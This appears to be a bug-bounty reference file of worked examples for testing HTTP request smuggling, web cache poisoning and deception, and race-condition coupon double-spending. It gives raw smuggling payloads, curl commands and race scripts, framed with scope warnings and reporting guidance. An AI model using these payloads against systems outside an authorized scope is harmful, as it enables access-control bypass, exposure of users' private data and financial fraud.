# HTTP Desync & Cache Attack — Worked Examples

> Referenced from [http-desync SKILL.md](../SKILL.md). Concrete request→response→conclusion examples for protocol-level testing.

## Table of Contents

- [Worked Example 1: CL.TE Request Smuggling Detection](#worked-example-1-clte-request-smuggling-detection)
- [Worked Example 2: CL.TE Exploitation — Admin Panel Access](#worked-example-2-clte-exploitation--admin-panel-access)
- [Worked Example 3: Web Cache Poisoning via X-Forwarded-Host](#worked-example-3-web-cache-poisoning-via-x-forwarded-host)
- [Worked Example 4: Web Cache Deception — PII Exfiltration](#worked-example-4-web-cache-deception--pii-exfiltration)
- [Worked Example 5: Race Condition — Coupon Double-Spend](#worked-example-5-race-condition--coupon-double-spend)
- [Worked Example 6: H2.CL Smuggling via HTTP/2 Downgrade](#worked-example-6-h2cl-smuggling-via-http2-downgrade)
- [Worked Example 7: CL.0 Server-Side Desync](#worked-example-7-cl0-server-side-desync)
- [Proxy Detection and Fingerprinting](#proxy-detection-and-fingerprinting)
- [Tool Commands Reference](#tool-commands-reference)

---

## Worked Example 1: CL.TE Request Smuggling Detection

**Scenario:** Target uses nginx as reverse proxy → Gunicorn/Django back-end. You suspect CL.TE because nginx prefers Content-Length and many Python back-ends prefer Transfer-Encoding.

### Step 1: Time-Based Detection (Safe)

Send a request where CL says the body is short, but TE chunked body includes a trailing partial request. If the back-end uses TE, it processes the chunked body and the trailing bytes poison the next request — causing a timeout.

**Request (send via raw socket or Burp Repeater with "Update Content-Length" OFF):**

```http
POST / HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Explanation:**
- `Content-Length: 6` tells the front-end (nginx) the body is `0\r\n\r\nX` (6 bytes)
- Front-end forwards the full 6 bytes to the back-end
- Back-end uses Transfer-Encoding: chunked, reads `0\r\n\r\n` as end of chunked body
- The trailing `X` is left in the connection buffer as the start of the NEXT request
- When the next real request arrives, the back-end tries to parse `XGET / HTTP/1.1...` — fails or times out

**Expected response if vulnerable:**
- First request: `200 OK` (processed normally by front-end)
- Second request (any normal follow-up on same connection): **timeout** or `400 Bad Request`

**Expected response if NOT vulnerable:**
- Both requests: `200 OK` (no desync — both sides agree on body boundary)

**Conclusion:** If the follow-up request times out or returns 400, you have a CL.TE desync. The front-end and back-end disagree on where the body ends.

### Step 2: Differential Confirmation

Confirm it's CL.TE and not something else. Send the inverse (TE.CL test) — this should NOT cause desync on a CL.TE target:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

POST /404check HTTP/1.1
X: x
```

If this request works normally (no desync), you've confirmed CL.TE: the front-end uses CL (and ignores TE), while the back-end uses TE (and ignores CL).

### Step 3: Prove Impact (Controlled)

**Do not proceed to exploitation on production without confirming program scope allows infrastructure-level testing.**

---

## Worked Example 2: CL.TE Exploitation — Admin Panel Access

**Scenario:** You confirmed CL.TE desync on `target.example.com`. The front-end blocks `/admin` paths. The back-end has no such restriction.

### Smuggled Request

```http
POST / HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example.com
X: x

```

**What happens:**
1. Front-end sees `POST /` (allowed) with CL: 60
2. Front-end forwards all 60 bytes to back-end
3. Back-end uses TE chunked — reads `0\r\n\r\n` as end of first request, responds `200 OK`
4. Remaining bytes `GET /admin HTTP/1.1\r\nHost: target.example.com\r\nX: x\r\n\r\n` sit in the connection buffer
5. Next request on this connection gets PREPENDED with the smuggled `GET /admin` bytes
6. Back-end processes `GET /admin` directly — bypassing the front-end's path restriction

**Response to capture:**

```http
HTTP/1.1 200 OK
Content-Type: text/html
...

<html><title>Admin Panel</title>
<h1>User Management</h1>
...
```

**Evidence for report:**
- Screenshot of admin panel HTML returned via smuggled request
- Timestamp correlation: your request vs the admin panel response
- Proof that direct `GET /admin` returns `403 Forbidden` from the front-end

**Severity:** Critical — full front-end access control bypass. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (9.3+)

---

## Worked Example 3: Web Cache Poisoning via X-Forwarded-Host

**Scenario:** Target uses Cloudflare CDN → Express.js origin. The origin reflects `X-Forwarded-Host` in page links and script sources but the CDN doesn't include it in the cache key.

### Step 1: Identify Unkeyed Input

```
curl -s -H "X-Forwarded-Host: canary123.example.com" \
  "https://target.example.com/login?cachebuster=abc123" \
  -D -
```

**Response:**

```http
HTTP/2 200
cf-cache-status: MISS
content-type: text/html

<html>
<script src="https://canary123.example.com/static/app.js"></script>
<link rel="canonical" href="https://canary123.example.com/login">
```

**Key observation:** `canary123.example.com` is reflected in the `<script src>` attribute. The `cf-cache-status: MISS` means this wasn't served from cache — the origin processed it.

### Step 2: Confirm Cache Stores the Poisoned Response

```
curl -s "https://target.example.com/login?cachebuster=abc123" -D -
```

**Response (no X-Forwarded-Host this time):**

```http
HTTP/2 200
cf-cache-status: HIT
age: 3

<html>
<script src="https://canary123.example.com/static/app.js"></script>
```

**Conclusion:** The poisoned response is now cached for this cache key. Any user requesting the same cache key (`/login?cachebuster=abc123`) gets a page loading JavaScript from `canary123.example.com`. To confirm production impact, repeat without the cachebuster and check if the query string is part of the cache key. If the attacker hosts malicious JS there, this is **stored XSS via cache poisoning**.

### Step 3: Clean Up

Remove the cachebuster and check if the production cache is affected:

```
curl -s "https://target.example.com/login" -D - | grep "canary123"
```

If this returns results, the production cache is poisoned — report immediately and request the cache be purged.

**Evidence for report:**
1. Curl showing reflection of X-Forwarded-Host in response (MISS)
2. Curl showing cached response serves the poisoned content (HIT)
3. Curl from different IP/browser showing same poisoned response

**Severity:** Critical — stored XSS affecting all visitors. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

**Common false positive:** If `cf-cache-status: DYNAMIC` or `Cache-Control: no-store` / `private`, the response isn't stored in shared caches — no cache poisoning impact. Note: `no-cache` still allows storage but requires revalidation; only `no-store` prevents caching entirely.

---

## Worked Example 4: Web Cache Deception — PII Exfiltration

**Scenario:** Target uses a CDN that caches responses based on file extension. The origin serves user profile data on `/account/profile` regardless of the path suffix.

### Step 1: Check Path Extension Handling

```
curl -s "https://target.example.com/account/profile/x.css" \
  -H "Cookie: session=VICTIM_SESSION_TOKEN" -D -
```

**Response:**

```http
HTTP/2 200
cf-cache-status: MISS
content-type: text/html
cache-control: public, max-age=3600

<html>
<h1>Welcome, John Doe</h1>
<p>Email: john.doe@company.com</p>
<p>Phone: +1-555-0123</p>
<p>SSN: ***-**-1234</p>
```

**Key observation:** The origin serves the private profile page for `/account/profile/x.css` (it ignores the `/x.css` suffix). The CDN sees `.css` extension and caches it.

### Step 2: Access Cached Private Data (Attacker Perspective)

After the victim visits the crafted URL (sent via phishing, social engineering):

```
curl -s "https://target.example.com/account/profile/x.css" -D -
```

**Response (no auth cookie):**

```http
HTTP/2 200
cf-cache-status: HIT
age: 45

<html>
<h1>Welcome, John Doe</h1>
<p>Email: john.doe@company.com</p>
<p>Phone: +1-555-0123</p>
```

**Conclusion:** Victim's private data served from cache without authentication.

**Evidence for report:**
1. URL path with static extension returns private page content
2. Response cached by CDN (cf-cache-status: HIT)
3. Second request without auth returns same private data
4. Use TWO different sessions/IPs to prove cross-user access

**Severity:** High (requires victim to click attacker-crafted link). CVSS: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

**Variants to test:**

| Suffix | Why it might work |
|--------|------------------|
| `/x.css` | CDN caches CSS by default |
| `/x.js` | CDN caches JavaScript |
| `/x.png` | Image extension |
| `%2Fx.css` | Encoded slash — CDN decodes, origin doesn't |
| `;x.css` | Path parameter — CDN sees extension, origin ignores |
| `/x.avif` | Newer format, CDN may cache aggressively |

---

## Worked Example 5: Race Condition — Coupon Double-Spend

**Scenario:** E-commerce target has single-use coupon code `SAVE50`. You want to test if applying it concurrently allows double-spend.

### Step 1: Prepare the Race

Using Turbo Intruder (Burp extension) or a custom script. The key is the **single-packet attack** for HTTP/2 or **last-byte sync** for HTTP/1.1.

**HTTP/2 single-packet attack concept:**

```python
# Pseudocode — send 10 identical requests in one TCP packet
import h2.connection

conn = h2.connection.H2Connection()
# ... establish connection ...

# Send 10 streams with all headers
for i in range(10):
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers=[
        (':method', 'POST'),
        (':path', '/api/cart/apply-coupon'),
        (':authority', 'target.example.com'),
        ('content-type', 'application/json'),
        ('cookie', 'session=YOUR_SESSION'),
    ])
    # Send body for each stream BUT hold back END_STREAM flag
    conn.send_data(stream_id, b'{"coupon":"SAVE50"}')

# Now send all END_STREAM flags at once — server processes all simultaneously
for stream_id in stream_ids:
    conn.send_data(stream_id, b'', end_stream=True)
```

**HTTP/1.1 low-fidelity parallel test with curl (simpler but has network jitter):**

```bash
# Send 10 concurrent requests (not true last-byte sync — use Turbo Intruder for precision)
for i in $(seq 1 10); do
  curl -s -X POST "https://target.example.com/api/cart/apply-coupon" \
    -H "Content-Type: application/json" \
    -H "Cookie: session=YOUR_SESSION" \
    -d '{"coupon":"SAVE50"}' &
done
wait
```

**Note:** The bash approach has network jitter. For precise timing, use Turbo Intruder's single-packet attack or a custom HTTP/2 script.

### Step 2: Analyze Responses

**Vulnerable response (both succeed):**

```json
// Response 1 (stream 1):
{"status": "success", "discount": "$50.00", "message": "Coupon applied"}

// Response 2 (stream 2):
{"status": "success", "discount": "$50.00", "message": "Coupon applied"}

// Responses 3-10:
{"status": "error", "message": "Coupon already used"}
```

**Evidence:** Two `200 OK` with `"success"` out of 10 attempts = race condition confirmed. The server checked coupon validity before marking it used, and two requests passed the check simultaneously.

**Not vulnerable:**

```json
// Response 1: {"status": "success", "discount": "$50.00"}
// Responses 2-10: {"status": "error", "message": "Coupon already used"}
```

Only one success = proper serialization (database lock or atomic operation).

### Step 3: Prove Business Impact

- Check the cart: is the coupon applied twice ($100 discount instead of $50)?
- Check order history: can you complete checkout with the double discount?
- Screenshot the cart showing the inflated discount

**Evidence for report:**
1. Response timestamps showing two concurrent successful coupon applications
2. Cart state showing double discount applied
3. Proof that a normal sequential attempt only allows one application

**Severity:** High — financial impact (doubled discounts). Medium if the discount is trivial.

---

## Worked Example 6: H2.CL Smuggling via HTTP/2 Downgrade

**Scenario:** Target's CDN speaks HTTP/2 to clients but downgrades to HTTP/1.1 when talking to the origin. The CDN doesn't strip injected `Content-Length` headers from HTTP/2 requests.

### Step 1: Test H2 → H1 Downgrade

First, confirm the setup:

```bash
curl -v --http2 "https://target.example.com/" 2>&1 | grep -i "< server\|< via\|ALPN"
```

If you see `ALPN: h2` in the TLS negotiation but `Via: 1.1` in the response headers, the CDN is downgrading.

### Step 2: Inject Content-Length

Using a tool that allows raw HTTP/2 header manipulation (e.g., h2cSmuggler, Burp with HTTP/2 support):

```
# HTTP/2 pseudo-headers
:method: POST
:path: /
:authority: target.example.com

# Standard headers
content-type: application/x-www-form-urlencoded
content-length: 0

# Body (sent as DATA frame):
GET /admin HTTP/1.1
Host: target.example.com


```

**What happens:**
1. HTTP/2 request arrives at CDN with `content-length: 0` header AND a body (DATA frame)
2. CDN downgrades to HTTP/1.1, forwards both the CL header and the body
3. Origin reads `Content-Length: 0`, processes zero-length body, and treats `GET /admin...` as the next request on the connection
4. `GET /admin` is processed by the origin without front-end access controls

**Key insight:** HTTP/2 doesn't use Content-Length for framing (DATA frames are self-delimiting). But when the CDN converts to HTTP/1.1, the CL header becomes meaningful and creates a desync.

### Detection Signal

Detection is indirect — you won't see two HTTP/1.1 responses on a single H2 stream. Instead:
- **Timeout on follow-up:** Send a normal request on the same H2 connection after the smuggling attempt. If the follow-up times out or returns an unexpected response (e.g., admin panel HTML instead of normal page), the smuggled request was processed.
- **Response queue poisoning:** The smuggled request's response may be served to the NEXT user's request on the shared back-end connection — check for response content that doesn't match what you requested.

---

## Worked Example 7: CL.0 Server-Side Desync

**Scenario:** You find that the target's `/health` endpoint doesn't read the request body. Any body sent is left in the connection buffer for the next request.

### Step 1: Identify CL.0 Endpoint

```
curl -s -X POST "https://target.example.com/health" \
  -H "Content-Length: 50" \
  -d 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
  -D -
```

(Note: curl overrides Content-Length with the actual body size when using `-d`. For precise CL control, use raw sockets, netcat, or Burp Repeater with "Update Content-Length" disabled.)

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "healthy"}
```

The server responded 200 and ignored the body. On a keep-alive connection, those bytes are now sitting in the buffer.

### Step 2: Exploit via Connection Reuse

Send a POST to `/health` with a body that contains a smuggled request, on a keep-alive connection:

```http
POST /health HTTP/1.1
Host: target.example.com
Content-Length: 70
Connection: keep-alive

GET /api/admin/users HTTP/1.1
Host: target.example.com
Cookie: x

```

**What happens:**
1. Server processes `POST /health` → returns `{"status":"healthy"}`
2. Server ignores the body (CL.0 behavior)
3. The body bytes (`GET /api/admin/users...`) stay in the buffer
4. Next request on this connection is prepended/replaced with the smuggled request
5. Server processes `GET /api/admin/users` with whatever cookies the NEXT user sends

**Where to find CL.0 endpoints:**
- `/health`, `/healthz`, `/ping`, `/ready`, `/status`
- Static file endpoints (`.js`, `.css`, `.png`)
- Endpoints that return early without reading body
- 301/302 redirect endpoints (redirect before body processing)

---

## Proxy Detection and Fingerprinting

Before testing, identify the proxy stack. Each component introduces specific desync opportunities.

### Quick Fingerprinting Commands

```bash
# Identify CDN/proxy via response headers
curl -s -D - "https://target.example.com/" | grep -iE \
  "server:|via:|x-cache|cf-|x-amz|x-varnish|x-fastly|x-served|x-proxy"

# Check HTTP/2 support (ALPN negotiation)
curl -v --http2 "https://target.example.com/" 2>&1 | grep ALPN

# Detect proxy by error page styling
curl -s "https://target.example.com/nonexistent-path-12345" | head -20

# Check Transfer-Encoding handling
curl -s -H "Transfer-Encoding: chunked" \
  -H "Transfer-Encoding: x" \
  "https://target.example.com/" -D -

# Test for proxy-specific headers
curl -s -H "X-Forwarded-Host: canary.test" \
  "https://target.example.com/" | grep "canary"
```

### Fingerprint-to-Attack Matrix

| You See | Proxy Likely | Primary Attack |
|---------|-------------|----------------|
| `cf-cache-status`, `cf-ray` | Cloudflare | Cache poisoning (unkeyed headers), cache deception |
| `x-amz-cf-id` | CloudFront | Query param cache poisoning, origin header injection |
| `x-varnish`, `Age` | Varnish | VCL bypass, cache poisoning via Vary |
| `server: nginx` + `via:` | Nginx reverse proxy | CL.TE, TE obfuscation, path normalization desync |
| `server: AkamaiGHost` | Akamai | Pragma debug headers, edge-side cache poisoning |
| `x-served-by: cache-` | Fastly | Surrogate-Control abuse, edge compute bypass |
| `server: envoy` | Envoy/Istio | Path normalization (%2F), H2 downgrade smuggling |
| `via: 1.1 haproxy` | HAProxy | Tunnel mode CL.0, strict parsing edge cases |
| H2 ALPN + `via: 1.1` | H2→H1 downgrade | H2.CL, H2.TE header injection |

---

## Tool Commands Reference

### Burp Suite

| Task | Where |
|------|-------|
| Raw smuggling | Repeater → uncheck "Update Content-Length" → send raw bytes |
| TE obfuscation | Repeater → manually edit Transfer-Encoding variations |
| HTTP/2 testing | Repeater → toggle HTTP/2 mode → inject pseudo-headers |
| Turbo Intruder (races) | Extensions → Turbo Intruder → `race-single-packet-attack.py` |
| Param Miner (cache) | Extensions → Param Miner → right-click → "Guess headers" |
| HTTP Request Smuggler | Extensions → HTTP Request Smuggler → "Launch smuggle probe" |

### CLI Tools

```bash
# smuggler — automated smuggling detection
python3 smuggler.py -u https://target.example.com/

# h2csmuggler — HTTP/2 cleartext (h2c) upgrade smuggling
# Note: only for h2c upgrade attacks, NOT for HTTPS H2→H1 downgrade testing
python3 h2csmuggler.py -x https://target.example.com/ \
  --test

# Web Cache Vulnerability Scanner (WCVS)
# Use -sh for single header test, -hw for header wordlist file
wcvs -u https://target.example.com/ -sh "X-Forwarded-Host: canary.test"

# Race condition via curl (basic)
seq 1 20 | xargs -P 20 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST "https://target.example.com/api/redeem" \
  -H "Cookie: session=TOKEN" \
  -d '{"code":"PROMO"}'
```

### Turbo Intruder Single-Packet Script

```python
# For Burp Turbo Intruder — single-packet attack (all requests in one TCP packet)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    # Queue 20 identical requests, all gated
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Release all at once — single TCP packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## False Positive Checklist

Before reporting, verify your finding isn't a false positive:

| What You See | Check This | It's a FP If |
|---|---|---|
| Timeout on follow-up request | Retry 5+ times for consistency | Timeout is intermittent (network issue, not desync) |
| Different response for CL vs TE | Confirm with differential test (Step 2 above) | Both CL.TE and TE.CL tests show desync (likely testing error) |
| Header reflected in cached response | Remove header, re-request | Response WITHOUT header also reflects it (template default) |
| Two successful race responses | Check actual state (DB, cart, balance) | Second "success" response has empty/error body (soft-200) |
| Admin page via smuggling | Verify content is actual admin data | Generic 200 page / login redirect / empty body |
| Cache HIT on private page | Check Cache-Control headers | `Cache-Control: no-store` or `private` means origin intends no shared caching — but CDN may ignore these; verify with `cf-cache-status` or equivalent |
